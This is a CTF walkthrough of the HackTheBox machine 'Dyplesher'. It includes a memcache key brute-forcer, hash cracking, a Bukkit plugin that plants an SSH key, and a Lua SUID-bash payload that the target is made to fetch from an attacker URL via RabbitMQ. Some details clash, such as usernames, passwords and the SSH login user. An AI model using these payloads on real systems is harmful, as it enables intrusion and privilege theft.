---
title: HackTheBox-Dyplesher
author: a3nk17
date: 2020-10-25 
excerpt: Dyplesher, a Linux machine created by HackTheBox felamos & yuntao, was an overall insane difficulty box. The inital foothold was finding the .git folder on test.dyplesher.htb which give us the credentials for the memcache server trying rockyou we can leak few hashes from the memcache and we can crack one of that.Using the password we got from the memcache we can login to the gogs as felamos from which we see a gitlab mirror/backup. We see a repo.zip folder on the release page of the repository..
thumbnail: /assets/img/posts/dyplesher/info.png
categories: [HackTheBox, Retired]
tags: [memcache, sqlite, minecraft, capabilities, pcap, amqp, rabbitmq, lua]
---

![info](/assets/img/posts/dyplesher/info.png)


Dyplesher, a Linux  was an overall insane difficulty box. 

## Scan the Galaxy

```bash
a3nk17@kali:~/htb/dyplesher$ sudo nmap -sT -p- 10.10.10.190
Nmap scan report for test.dyplesher.htb (10.10.10.190)
Host is up (0.35s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7e:ca:81:78:ec:27:8f:50:60:db:79:cf:97:f7:05:c0 (RSA)
|   256 e0:d7:c7:9f:f2:7f:64:0d:40:29:18:e1:a1:a0:37:5e (ECDSA)
|_  256 9f:b2:4c:5c:de:44:09:14:ce:4f:57:62:0b:f9:71:81 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git:
|   10.10.10.190:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: first commit
|     Remotes:
|_      http://localhost:3000/felamos/memcached.git
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=fcabdf9be48c2301; Path=/; HttpOnly
|     Set-Cookie: _csrf=U4cL_eEiLyi0YwtWaBvma4Z_sEU6MTU5MDI2MjIyODkzODM5Mzk1Mg%3D%3D; Path=/; Expires=Sun, 24 May 2020 19:30:28 GMT; HttpOnly
|     Date: Sat, 23 May 2020 19:30:28 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="U4cL_eEiLyi0YwtWaBvma4Z_sEU6MTU5MDI2MjIyODkzODM5Mzk1Mg==" />
|     <meta name="_suburl" content="" />
|     <meta proper
|   HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=9772605cc0de9578; Path=/; HttpOnly
|     Set-Cookie: _csrf=EegCp8gnCuuySMZtyGN1O3MdKTE6MTU5MDI2MjIzNjI3NTc2ODU1Nw%3D%3D; Path=/; Expires=Sun, 24 May 2020 19:30:36 GMT; HttpOnly
|     Date: Sat, 23 May 2020 19:30:36 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="EegCp8gnCuuySMZtyGN1O3MdKTE6MTU5MDI2MjIzNjI3NTc2ODU1Nw==" />
|     <meta name="_suburl" content="" />
|_    <meta
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.80%I=7%D=5/24%Time=5EC979D6%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2063,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gogs=fcabdf9be48c2301;\
SF:x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=U4cL_eEiLyi0YwtWaBvma4Z_
SF:sEU6MTU5MDI2MjIyODkzODM5Mzk1Mg%3D%3D;\x20Path=/;\x20Expires=Sun,\x2024\
SF:x20May\x202020\x2019:30:28\x20GMT;\x20HttpOnly\r\nDate:\x20Sat,\x2023\x
SF:20May\x202020\x2019:30:28\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<he
SF:ad\x20data-suburl=\"\">\n\t<meta\x20http-equiv=\"Content-Type\"\x20cont
SF:ent=\"text/html;\x20charset=UTF-8\"\x20/>\n\t<meta\x20http-equiv=\"X-UA
SF:-Compatible\"\x20content=\"IE=edge\"/>\n\t\n\t\t<meta\x20name=\"author\
SF:"\x20content=\"Gogs\"\x20/>\n\t\t<meta\x20name=\"description\"\x20conte
SF:nt=\"Gogs\x20is\x20a\x20painless\x20self-hosted\x20Git\x20service\"\x20
SF:/>\n\t\t<meta\x20name=\"keywords\"\x20content=\"go,\x20git,\x20self-hos
SF:ted,\x20gogs\">\n\t\n\t<meta\x20name=\"referrer\"\x20content=\"no-refer
SF:rer\"\x20/>\n\t<meta\x20name=\"_csrf\"\x20content=\"U4cL_eEiLyi0YwtWaBv
SF:ma4Z_sEU6MTU5MDI2MjIyODkzODM5Mzk1Mg==\"\x20/>\n\t<meta\x20name=\"_subur
SF:l\"\x20content=\"\"\x20/>\n\t\n\t\n\t\n\t\t<meta\x20proper")%r(Help,67,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(
SF:HTTPOptions,189F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nContent-Type:\x20
SF:text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;\x2
SF:0Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gogs=9772605cc0de9578;\x20
SF:Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=EegCp8gnCuuySMZtyGN1O3MdKTE
SF:6MTU5MDI2MjIzNjI3NTc2ODU1Nw%3D%3D;\x20Path=/;\x20Expires=Sun,\x2024\x20
SF:May\x202020\x2019:30:36\x20GMT;\x20HttpOnly\r\nDate:\x20Sat,\x2023\x20M
SF:ay\x202020\x2019:30:36\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head\
SF:x20data-suburl=\"\">\n\t<meta\x20http-equiv=\"Content-Type\"\x20content
SF:=\"text/html;\x20charset=UTF-8\"\x20/>\n\t<meta\x20http-equiv=\"X-UA-Co
SF:mpatible\"\x20content=\"IE=edge\"/>\n\t\n\t\t<meta\x20name=\"author\"\x
SF:20content=\"Gogs\"\x20/>\n\t\t<meta\x20name=\"description\"\x20content=
SF:\"Gogs\x20is\x20a\x20painless\x20self-hosted\x20Git\x20service\"\x20/>\
SF:n\t\t<meta\x20name=\"keywords\"\x20content=\"go,\x20git,\x20self-hosted
SF:,\x20gogs\">\n\t\n\t<meta\x20name=\"referrer\"\x20content=\"no-referrer
SF:\"\x20/>\n\t<meta\x20name=\"_csrf\"\x20content=\"EegCp8gnCuuySMZtyGN1O3
SF:MdKTE6MTU5MDI2MjIzNjI3NTc2ODU1Nw==\"\x20/>\n\t<meta\x20name=\"_suburl\"
SF:\x20content=\"\"\x20/>\n\t\n\t\n\t\n\t\t<meta");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 24 01:02:23 2020 -- 1 IP address (1 host up) scanned in 159.27 seconds
```

## Website

On the website we have a couple of non-functional links like **Forums** and **Store**. The **Staff** link goes to another static page with a list of staff users.

![](/assets/img/posts/dyplesher/image-20200524104320814.png)

visiting on http open port `80`

![](/assets/img/posts/dyplesher/1.png)



![](/assets/img/posts/dyplesher/image-20200524104356684.png)

Dirbusting shows a few interesting links: **login**, **register** and **home**:

```bash
a3nk17@kali:~/htb/dyplesher$ ffuf -w $WLRD -t 50 -u http://dyplesher.htb/FUZZ
________________________________________________

css                     [Status: 301, Size: 312, Words: 20, Lines: 10]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10]
login                   [Status: 200, Size: 4188, Words: 1222, Lines: 84]
register                [Status: 302, Size: 350, Words: 60, Lines: 12]
img                     [Status: 301, Size: 312, Words: 20, Lines: 10]
home                    [Status: 302, Size: 350, Words: 60, Lines: 12]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10]
staff                   [Status: 200, Size: 4389, Words: 1534, Lines: 103]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
```

The login and register `URL` show a login page. We can try a few default `creds` but we're not able to get in.

![](/assets/img/posts/dyplesher/image-20200524105136663.png)

`Gobusting` the home `directory` shows a couple of other directories, all of which we can't reach because we are `redirected` to the `login page`.

```bash
a3nk17@kali:~/htb/dyplesher$ ffuf -w $WLRW -t 50 -u http://dyplesher.htb/home/FUZZ
________________________________________________

add                     [Status: 302, Size: 350, Words: 60, Lines: 12]
.                       [Status: 301, Size: 312, Words: 20, Lines: 10]
delete                  [Status: 302, Size: 350, Words: 60, Lines: 12]
reset                   [Status: 302, Size: 350, Words: 60, Lines: 12]
console                 [Status: 302, Size: 350, Words: 60, Lines: 12]
players                 [Status: 302, Size: 350, Words: 60, Lines: 12]
```

## Gogs website

There's a Gogs instance running on port 3000. Gogs is a self-hosted Git service so there's a good chance we'll have to find the source code of an application on there.

![](/assets/img/posts/dyplesher/image-20200524105548752.png)

We can see the `same list of 3` users we saw on the Staff page but there are no` public` repositories accessible from our `unauthenticated user`.

![](/assets/img/posts/dyplesher/image-20200524105743919.png)

When `dirbusting` the site we find a **debug** directory which contains the pprof profiler. I looked around and it didn't seem to be useful for `anything`.

```bash
a3nk17@kali:~/htb/dyplesher$ ffuf -w $WLDC -t 50 -u http://dyplesher.htb:3000/FUZZ
________________________________________________

                        [Status: 200, Size: 7851, Words: 456, Lines: 252]
admin                   [Status: 302, Size: 34, Words: 2, Lines: 3]
assets                  [Status: 302, Size: 31, Words: 2, Lines: 3]
avatars                 [Status: 302, Size: 32, Words: 2, Lines: 3]
css                     [Status: 302, Size: 28, Words: 2, Lines: 3]
debug                   [Status: 200, Size: 160, Words: 18, Lines: 5]
explore                 [Status: 302, Size: 37, Words: 2, Lines: 3]
img                     [Status: 302, Size: 28, Words: 2, Lines: 3]
issues                  [Status: 302, Size: 34, Words: 2, Lines: 3]
js                      [Status: 302, Size: 27, Words: 2, Lines: 3]
plugins                 [Status: 302, Size: 32, Words: 2, Lines: 3]
```

## Vhost fuzzing



We haven't found much yet so we'll try fuzzing vhosts next and we find a **test.dyplesher.htb** vhost.

```bash
a3nk17@kali:~/htb/dyplesher$ ffuf -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -H "Host: FUZZ.dyplesher.htb" -u http://dyplesher.htb -fr "Worst Minecraft Server"
________________________________________________

test                    [Status: 200, Size: 239, Words: 16, Lines: 15]
```

There's a `memcache` test interface running on the vhost where we can add key/values to the memcache instance running on `port 11211`. There doesn't seem to be any `vulnerability` that I can see on this page.

![](/assets/img/posts/dyplesher/image-20200524110832067.png)

When dirbusting we find a `git repository`, then we can use git-dumper to copy it to our `local machine`.

```bash
a3nk17@kali:~/htb/dyplesher$ ffuf -w $WLDC -t 50 -u http://test.dyplesher.htb/FUZZ
________________________________________________

index.php               [Status: 200, Size: 239, Words: 16, Lines: 15]
                        [Status: 200, Size: 239, Words: 16, Lines: 15]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
.htpasswd               [Status: 403, Size: 283, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 283, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 283, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 283, Words: 20, Lines: 10]

snowscan@kali:~/htb/dyplesher/git$ ~/tools/git-dumper/git-dumper.py http://test.dyplesher.htb .
[-] Testing http://test.dyplesher.htb/.git/HEAD [200]
[-] Testing http://test.dyplesher.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://test.dyplesher.htb/.gitignore [404]
[-] Fetching http://test.dyplesher.htb/.git/description [200]
[-] Fetching http://test.dyplesher.htb/.git/COMMIT_EDITMSG [200]
[...]
```

Inside, we find the source code of the` memcache test application`, along with the memcache credentials: `felamos / zxcvbnm`

```php
<pre>
<?php
if($_GET['add'] != $_GET['val']){
	$m = new Memcached();
	$m->setOption(Memcached::OPT_BINARY_PROTOCOL, true);
	$m->setSaslAuthData("felamos", "zxcvbnm");
	$m->addServer('127.0.0.1', 11211);
	$m->add($_GET['add'], $_GET['val']);
	echo "Done!";
}
else {
	echo "its equal";
}
?>
</pre>
```

## Memcache enumeration

We don't have the list of `memcache` keys but we can write a script that will `brute force` them and return the values.

```python
#!/usr/bin/env python3

import bmemcached
from pprint import pprint

client = bmemcached.Client('10.10.10.190:11211', 'felamos', 'zxcvbnm')

with open("/usr/share/seclists/Discovery/Variables/secret-keywords.txt") as f:
    for x in [x.strip() for x in f.readlines()]:
        result = str(client.get(x))
        if 'None' not in result:
        	print(x + ": " + result)
```

The `memcache` instance contains some email addresses, `usernames` and `password` hashes that we will try to crack.

```bash
a3nk17@kali:~/htb/dyplesher$ ./brute_keys.py 
email: MinatoTW@dyplesher.htb
felamos@dyplesher.htb
yuntao@dyplesher.htb

password: $2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS

username: MinatoTW
felamos
yuntao
```

We're able to crack the password for user felamos: `mommy1`

```bash
a3nk17@kali:~/htb/dyplesher$ john -w=/usr/share/wordlists/rockyou.txt memcache-hashes.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mommy1           (?)

a3nk17@kali:~/htb/dyplesher$ cat ~/.john/john.pot 
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK:mommy1
```

## Getting access to the Gogs repository

We're able to log into the Gogs instance with `Felamos`' credentials. There's two repositories available: **gitlab** and **memcached**.

![](/assets/img/posts/dyplesher/image-20200524112126061.png)

The memcached repo contains the same information we got earlier from the .git directory on the test.dyplesher.htb website. However the gitlab repo contains a zipped backup of the repositories.

![](/assets/img/posts/dyplesher/image-20200524112259332.png)

After unzipping the file, we get a bunch of directories with .bundle files. These are essentially a full repository in single file.

```bash
a3nk17@kali:~/htb/dyplesher$ ls -laR repositories/
repositories/:
total 12
[...]
repositories/@hashed/4b/22:
total 24
drwxr-xr-x 3 snowscan snowscan  4096 Sep  7  2019 .
drwxr-xr-x 3 snowscan snowscan  4096 Sep  7  2019 ..
drwxr-xr-x 2 snowscan snowscan  4096 Sep  7  2019 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a
-rw-r--r-- 1 snowscan snowscan 10837 Sep  7  2019 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
```

We can use the `git clone` command to extract the `repository` files from those bundle files. There are `4` repositories inside the `backup` file:

- VoteListener
- MineCraft server
- PhpBash
- NightMiner

```bash
a3nk17@kali:~/htb/dyplesher/git-backup$ ls -la
total 28
drwxr-xr-x 7 snowscan snowscan 4096 May 23 16:55 .
drwxr-xr-x 6 snowscan snowscan 4096 May 24 11:26 ..
drwxr-xr-x 4 snowscan snowscan 4096 May 23 15:44 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a
drwxr-xr-x 8 snowscan snowscan 4096 May 23 23:42 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce
drwxr-xr-x 3 snowscan snowscan 4096 May 23 15:43 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
drwxr-xr-x 3 snowscan snowscan 4096 May 23 15:43 d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35
```

There's an `SQLite database` file inside the **LoginSecurity** directory:

```bash
a3nk17@kali:~/htb/dyplesher/git-backup$ ls -l 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/
total 8
-rw-r--r-- 1 snowscan snowscan  396 May 24 00:44 config.yml
-rw-r--r-- 1 snowscan snowscan 3072 May 23 15:43 users.db
an3k17@kali:~/htb/dyplesher/git-backup$ file 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/users.db 
4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/users.db: SQLite 3.x database, last written using SQLite version 3007002
```

The file contains another set of `hashed credentials`:

I created an account and found three emails

```
felamos@dyplesher.htb
minatotw@dyplesher.htb
yuntao@dyplesher.htb

```
which give password `hasses ` of 3 user
```
$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
```
only one of which is crackable as `mommy1`

```bash
$ sqlite3 ./4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
18fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|/192.168.43.81
```

Here we go, got another password: `alexis1`

```
a3nk17@kali:~/htb/dyplesher$ john -w=/usr/share/wordlists/rockyou.txt git-hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexis1          (?)
1g 0:00:00:06 DONE (2020-05-24 11:36) 0.1501g/s 243.2p/s 243.2c/s 243.2C/s alexis1..serena
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
![](/assets/img/posts/dyplesher/4.png)


## RCE using Minecraft plugin

Now that we have more credentials, we can go back to the main webpage and log in. We have a dashboard with some player `statistics` and a menu to `upload plugins`.

![](/assets/img/posts/dyplesher/image-20200524113803504.png)

Trying the upload feature and `uploading` just a random stuff we see we need to upload a valid `minecraft plugin`

![](/assets/img/posts/dyplesher/5.png)

The console displays the messages from the `server`.

![](/assets/img/posts/dyplesher/image-20200524113905691.png)

Looks like we'll have to create a `plugin` to get access to the server. We can follow the following blog post `instructions` on how to create a `plugin with Java`: [https://bukkit.gamepedia.com/Plugin_Tutorial](https://bukkit.gamepedia.com/Plugin_Tutorial)

After trying a couple of `different payloads` I wasn't able to get anything to connect back to me so I assumed there was a firewall `configured` to block outbound connections. So instead I used the following to write my ``SSH keys`` to Fuck You `MinatoTW` home directory:

```java
package pwn.a3nk17.plugin;

import java.io.*;
import org.bukkit.*;
import org.bukkit.plugin.java.JavaPlugin;
import java.util.logging.Logger;

public class main extends JavaPlugin {

    @Override
    public void onEnable() {    	
    	Bukkit.getServer().getLogger().info("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");
    	try {
		    FileWriter myWriter = new FileWriter("/home/MinatoTW/.ssh/authorized_keys");
		    myWriter.write("ssh-rsa AAAAB3NzaC1yc2EAAA[...]JsSkunC1TzjHyY70NfMskJViGcs= snowscan@kali");
		    myWriter.close();
		    Bukkit.getServer().getLogger().info("Successfully wrote to the file.");
		} catch (IOException e) {
			Bukkit.getServer().getLogger().info("An error occurred.");
		    e.printStackTrace();
		}
    	Bukkit.getServer().getLogger().info("YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY");
    }
    
    @Override
    public void onDisable() {
    	
    }
}
```

After adding and reloading the script, our `SSH public key` is written to the home directory and we can log in.
```bash
root@kali# ssh -i ~/keys/gen root@10.10.10.190 
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 03 Jun 2020 06:10:11 PM UTC

  System load:  0.02              Processes:              247
  Usage of /:   6.8% of 97.93GB   Users logged in:        1
  Memory usage: 40%               IP address for ens33:   10.10.10.190
  Swap usage:   0%                IP address for docker0: 172.17.0.1


57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Wed Jun  3 18:09:14 2020 from 10.10.14.47
root@dyplesher:~#

```

![](/assets/img/posts/dyplesher/image-20200524114411007.png)

## Privesc to Felamos

Our user is part of the `wireshark group` so there's a good chance the next part involves traffic sniffing.

```bash
MinatoTW@dyplesher:~$ id
uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)
```

As `suspected`, the dumpcat program has been `configured` to with `elevated capabilities`:

```bash
MinatoTW@dyplesher:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/dumpcap = cap_net_admin,cap_net_raw+eip
```

We'll `capture packets` on the loopback interface in order to capture some of `traffic` for the `RabbitMQ instance`.

```bash
MinatoTW@dyplesher:~$ dumpcap -i lo -w local.pcap
Capturing on 'Loopback: lo'
File: local.pcap
Packets: 90
```

The `pcap` file contains some `AMQP messages` with additional credentials:

- `felamos  / tieb0graQueg`
- `yuntao   / wagthAw4ob`
- `MinatoTW / bihys1amFov`

![](/assets/img/posts/dyplesher/image-20200524114757641.png)



## Root privesc

The `send.sh` file contains a hint about what we need to do next:

```bash
felamos@dyplesher:~$ ls
cache  snap  user.txt  yuntao
felamos@dyplesher:~$ ls yuntao/
send.sh
felamos@dyplesher:~$ cat yuntao/send.sh 
#!/bin/bash

echo 'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue". Just send url to download plugins and our new code will review it and working plugins will be added to the server.' >  /dev/pts/{}
```

Cubberite plugins are basically just lua `scripts` so we can created a simple script `that'll` copy and make bash suid, then host that script `locally` with a local webserver.

```lua
os.execute("cp /bin/bash /tmp/snow")
os.execute("chmod 4777 /tmp/snow")
```

We'll reconnect to the box and port forward port `5672` so we can use the Pika Python library and publish messages to the RabbitMQ messaging bus: `ssh -L 5672:127.0.0.1:5672 felamos@10.10.10.190`

```python
#!/usr/bin/python

import pika

credentials = pika.PlainCredentials('yuntao', 'EashAnicOc3Op')
parameters = pika.ConnectionParameters('127.0.0.1', 5672, credentials=credentials)
connection = pika.BlockingConnection(parameters)

channel = connection.channel()

channel.exchange_declare(exchange='plugin_data', durable=True)
channel.queue_declare(queue='plugin_data', durable=True)
channel.queue_bind(queue='plugin_data', exchange='plugin_data', routing_key=None, arguments=None)
channel.basic_publish(exchange='plugin_data', routing_key="plugin_data", body='http://127.0.0.1:8080/pwn.lua')
print("Message sent, check the webserver to see if the LUA script was fetched.")
connection.close()
```

```bash
a3nk17@kali:~/htb/dyplesher$ python3 exploit.py 
Message sent, check the webserver to see if the LUA script was fetched.

felamos@dyplesher:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
127.0.0.1 - - [24/May/2020 15:57:29] "GET /pwn.lua HTTP/1.0" 200 -
```
#Explot.py

```python
#!/usr/bin/env python3
import pika

connection = pika.BlockingConnection(
    pika.ConnectionParameters(
        '127.0.0.1',
        5672,
        credentials=pika.PlainCredentials('yuntao', 'EashAnicOc3Op')
    )
)

channel = connection.channel()
channel.basic_publish(
    exchange='plugin_data',
    routing_key='',
    body='http://10.10.X.X/plugin.lua'
)
connection.close()
```


After a few moments, the `LUA script` is executed and we have a `SUID` bash we can use to get root.
```bash
root@dyplesher:~# whoami;hostname;cut -c 1-15 root.txt
root
dyplesher
sdrfebrt6bwwebd01c4
root@dyplesher:~#
```


![](/assets/img/posts/dyplesher/pwn.png)
